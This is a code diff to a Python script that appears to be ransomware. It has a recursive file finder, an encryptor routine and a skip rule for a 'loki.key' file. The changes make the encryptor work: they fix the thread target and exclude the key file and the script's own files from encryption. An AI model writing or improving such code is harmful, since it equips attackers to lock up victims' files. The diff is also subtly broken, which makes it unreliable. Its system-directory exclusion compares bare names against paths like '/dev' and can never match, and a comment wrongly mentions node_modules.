@@ -30,10 +30,14 @@ print_red_command = (f"\n[{Fore.YELLOW}>_{Fore.WHITE}]: {Fore.RED}¤{Fore.WHITE}
 def findFiles(path):
     files = []
     for f in os.listdir(path):
-        new_path = f"{path}/{f}"
+        new_path = os.path.join(path, f)
         if os.path.isdir(new_path):
+            if f in ['/dev', '/etc', '/export', '/kernel', '/opt', '/sbin', '/stand', '/tmp', '/usr', '/var']: # Ignore node_modules directory
+                continue
             files += findFiles(new_path)
         else:
+            if f in ['loki.key'] or f.endswith('.py'): # Ignore .py and loki.key files
+                continue
             files.append(new_path)
     return files
 
@@ -85,6 +89,6 @@ def encryptor():
 if __name__ == '__main__':
     encryptor()
 
-encryptor_thread = threading.Thread(target=encrypt)
+encryptor_thread = threading.Thread(target=encryptor)
 encryptor_thread.start()
 encryptor_thread.join()
